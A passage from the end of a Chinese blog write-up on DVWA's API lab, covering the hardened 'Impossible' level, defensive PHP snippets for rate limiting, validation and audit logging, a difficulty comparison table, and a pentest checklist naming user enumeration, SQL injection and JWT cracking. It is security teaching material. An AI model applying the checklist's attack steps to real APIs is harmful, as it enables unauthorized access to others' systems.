invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
+<ol>
+<li><strong>OAuth 2.0认证</strong> - 标准认证协议</li>
+<li><strong>Scope权限</strong> - 细粒度权限控制</li>
+<li><strong>分布式限流</strong> - Redis滑动窗口</li>
+<li><strong>严格授权</strong> - 每个操作都检查</li>
+<li><strong>输入验证</strong> - 验证所有输入</li>
+<li><strong>审计日志</strong> - 记录所有操作</li>
+<li><strong>错误不泄露</strong> - 统一错误信息</li>
+<li><strong>PDO预编译</strong> - 防止SQL注入</li>
+</ol>
+<p><strong>安全流程：</strong></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">API请求</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">1.</span> 验证OAuth Access <span class="built_in">Token</span></span><br><span class="line">    ↓</span><br><span class="line"><span class="number">2.</span> 检查<span class="built_in">Token</span>是否有效</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">3.</span> 检查Scope权限</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">4.</span> 检查限流</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">5.</span> 验证资源所有权</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">6.</span> 验证输入</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">7.</span> 执行操作</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">8.</span> 记录审计日志</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">9.</span> 返回响应</span><br></pre></td></tr></table></figure>
+
+<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都失败：</strong></p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">攻击<span class="number">1</span>：无<span class="built_in">Token</span>访问</span><br><span class="line">结果：<span class="number">401</span> Unauthorized</span><br><span class="line"></span><br><span class="line">攻击<span class="number">2</span>：伪造<span class="built_in">Token</span></span><br><span class="line">OAuth服务器验证 → 失败 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击<span class="number">3</span>：越权访问</span><br><span class="line">Scope检查 + 所有权检查 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击<span class="number">4</span>：批量赋值</span><br><span class="line">字段白名单 → 只允许特定字段</span><br><span class="line"></span><br><span class="line">攻击<span class="number">5</span>：<span class="keyword">DoS</span>攻击</span><br><span class="line">Redis限流 → 超过限制 → <span class="number">429</span> Too Many Requests</span><br><span class="line"></span><br><span class="line">攻击<span class="number">6</span>：SQL注入</span><br><span class="line">PDO预编译 → 无法注入</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="认证和授权"><a href="#认证和授权" class="headerlink" title="认证和授权"></a>认证和授权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 使用OAuth 2.0或OpenID Connect</span></span><br><span class="line"><span class="comment">// ✅ 使用JWT但签名验证严格</span></span><br><span class="line"><span class="comment">// ✅ 使用Scope控制细粒度权限</span></span><br><span class="line"><span class="comment">// ✅ 每个endpoint都检查权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ❌ 不要：</span></span><br><span class="line"><span class="comment">// - 硬编码API密钥</span></span><br><span class="line"><span class="comment">// - 使用简单的API密钥认证</span></span><br><span class="line"><span class="comment">// - 不检查授权</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="限流和DoS防护"><a href="#限流和DoS防护" class="headerlink" title="限流和DoS防护"></a>限流和DoS防护</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Redis限流</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_limit</span>(<span class="params"><span class="variable">$user_id</span>, <span class="variable">$limit</span>, <span class="variable">$window</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;rate:<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$current</span> = <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">incr</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$current</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">expire</span>(<span class="variable">$key</span>, <span class="variable">$window</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$current</span> &lt;= <span class="variable">$limit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证所有输入</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_user_input</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$errors</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>], FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&#x27;Invalid email&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&#x27;Username too short&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$errors</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="审计日志"><a href="#审计日志" class="headerlink" title="审计日志"></a>审计日志</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_api_access</span>(<span class="params"><span class="variable">$user_id</span>, <span class="variable">$method</span>, <span class="variable">$path</span>, <span class="variable">$status</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$user_id</span>,</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span> =&gt; <span class="variable">$method</span>,</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="variable">$status</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/api_access.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>认证</td>
+<td>❌ 无</td>
+<td>API密钥</td>
+<td>JWT</td>
+<td>OAuth 2.0</td>
+</tr>
+<tr>
+<td>授权</td>
+<td>❌ 无</td>
+<td>❌ 无</td>
+<td>基于角色</td>
+<td>Scope+角色</td>
+</tr>
+<tr>
+<td>限流</td>
+<td>❌</td>
+<td>简单文件</td>
+<td>❌</td>
+<td>Redis分布式</td>
+</tr>
+<tr>
+<td>SQL注入防护</td>
+<td>❌</td>
+<td>✅ PDO</td>
+<td>✅ PDO</td>
+<td>✅ PDO</td>
+</tr>
+<tr>
+<td>批量赋值防护</td>
+<td>❌</td>
+<td>白名单</td>
+<td>白名单</td>
+<td>严格白名单</td>
+</tr>
+<tr>
+<td>审计日志</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅ 完善</td>
+</tr>
+<tr>
+<td>敏感信息</td>
+<td>泄露</td>
+<td>部分保护</td>
+<td>保护</td>
+<td>完全保护</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>极易</td>
+<td>简单</td>
+<td>中等</td>
+<td>极难</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试清单：</strong></p>
+<ol>
+<li>✅ 发现所有API端点</li>
+<li>✅ 测试无认证访问</li>
+<li>✅ 枚举用户ID</li>
+<li>✅ 测试越权访问</li>
+<li>✅ 测试批量赋值</li>
+<li>✅ 测试SQL注入</li>
+<li>✅ 测试限流</li>
+<li>✅ JWT破解</li>
+</ol>
+<p><strong>防御清单：</strong></p>
+<ol>
+<li>✅ 使用OAuth 2.0</li>
+<li>✅ 实施Scope权限</li>
+<li>✅ 严格授权检查</li>
+<li>✅ 分布式限流</li>
+<li>✅ 输入验证</li>
+<li>✅ 完善审计日志</li>
+<li>✅ API版本管理</li>
+<li>✅ 使用API网关</li>
+</ol>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不攻击真实API</li>
+<li>学习是为了构建安全API</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/API_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - API (应用程序接口) 攻防练习详解">http://caixuya.github.io/2025/11/20/API_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/Brute_Force_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - Brute Force (暴力破解) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - Brute Force (暴力破解) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFAPI%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是API安全漏洞？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-REST-API"><span class="nav-number">2.2.</span> <span class="nav-text">1. REST API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-GraphQL-API"><span class="nav-number">2.3.</span> <span class="nav-text">2. GraphQL API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-SOAP-API"><span class="nav-number">2.4.</span> <span class="nav-text">3. SOAP API</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9AAPI%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤1：API枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E6%95%B0%E6%8D%AE%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.4.2.</span> <span class="nav-text">步骤2：数据枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">3.4.3.</span> <span class="nav-text">步骤3：未授权访问</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9ASQL%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.4.</span> <span class="nav-text">步骤4：SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45%EF%BC%9A%E6%89%B9%E9%87%8F%E8%B5%8B%E5%80%BC%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.5.</span> <span class="nav-text">步骤5：批量赋值攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46%EF%BC%9A%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7"><span class="nav-number">3.4.6.</span> <span class="nav-text">步骤6：删除用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A47%EF%BC%9ADoS%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.7.</span> <span class="nav-text">步骤7：DoS攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E8%8E%B7%E5%8F%96API%E5%AF%86%E9%92%A5"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：获取API密钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E7%BB%95%E8%BF%87%E9%99%90%E6%B5%81"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：绕过限流</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：越权访问</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9AJWT%E7%AE%97%E6%B3%95%E6%B7%B7%E6%B7%86%E6%94%BB%E5%87%BB"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：JWT算法混淆攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3JWT%E5%AF%86%E9%92%A5"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：暴力破解JWT密钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9AToken%E5%8A%AB%E6%8C%81"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：Token劫持</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A4%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83"><span class="nav-number">7.1.</span> <span class="nav-text">认证和授权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%90%E6%B5%81%E5%92%8CDoS%E9%98%B2%E6%8A%A4"><span class="nav-number">7.2.</span> <span class="nav-text">限流和DoS防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81"><span class="nav-number">7.3.</span> <span class="nav-text">输入验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97"><span class="nav-number">7.4.</span> <span class="nav-text">审计日志</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
